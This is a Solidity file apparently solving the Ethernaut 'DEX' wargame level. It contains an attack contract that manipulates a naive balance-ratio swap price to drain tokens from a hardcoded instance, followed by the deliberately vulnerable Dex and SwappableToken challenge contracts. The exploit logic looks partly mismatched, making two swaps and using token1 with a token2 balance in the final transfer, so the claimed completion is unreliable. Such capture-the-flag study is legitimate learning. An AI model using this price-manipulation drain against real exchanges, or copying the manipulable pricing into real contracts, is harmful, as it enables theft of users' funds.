// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title 22. DEX
 * @dev Drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
 */

interface IDex {
    function token1() external returns (address);

    function token2() external returns (address);

    function swap(address from, address to, uint256 amount) external;

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);
}

interface ISwappable {
    function approve(address owner, address spender, uint256 amount) external;
}

contract Ethernaut_Dex {
    IDex idex = IDex(0x70706267094360043049CA21bAeB5c96FB418e56);
    address token1 = idex.token1();
    address token2 = idex.token2();

    uint256 initialAmount = 9;

    function attack() public {
        ISwappable(token1).approve(
            msg.sender,
            address(this),
            type(uint256).max
        );
        IERC20(token1).transferFrom(
            msg.sender,
            address(this),
            idex.balanceOf(token1, msg.sender)
        );

        // 1. Do a big swap to move the price to an extreme
        swap1For2(initialAmount);
        initialAmount = idex.balanceOf(token2, msg.sender);

        // 2. Do the opposite swap to profit from the "artificial" price
        swap2For1(initialAmount);
        IERC20(token1).transferFrom(
            address(this),
            msg.sender,
            idex.balanceOf(token2, address(this))
        );
    }

    function getPrice() public view returns (uint256, uint256) {
        uint256 currentPrice1 = idex.getSwapPrice(
            token1,
            token2,
            initialAmount
        );
        uint256 currentPrice2 = idex.getSwapPrice(
            token2,
            token1,
            initialAmount
        );

        return (currentPrice1, currentPrice2);
    }

    function getBalance() public view returns (uint256, uint256) {
        uint256 bal1 = idex.balanceOf(token1, msg.sender);
        uint256 bal2 = idex.balanceOf(token2, msg.sender);

        return (bal1, bal2);
    }

    function swap1For2(uint256 _amount) public {
        idex.approve(address(idex), type(uint256).max);
        idex.swap(token1, token2, _amount);
    }

    function swap2For1(uint256 _amount) public {
        idex.approve(address(idex), type(uint256).max);
        idex.swap(token2, token1, _amount);
    }
}

// 🎉 Level completed! 🎉

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() Ownable(msg.sender) {} // Edited to match openzeppelin ^5

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(
        address token_address,
        uint256 amount
    ) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens"
        );
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
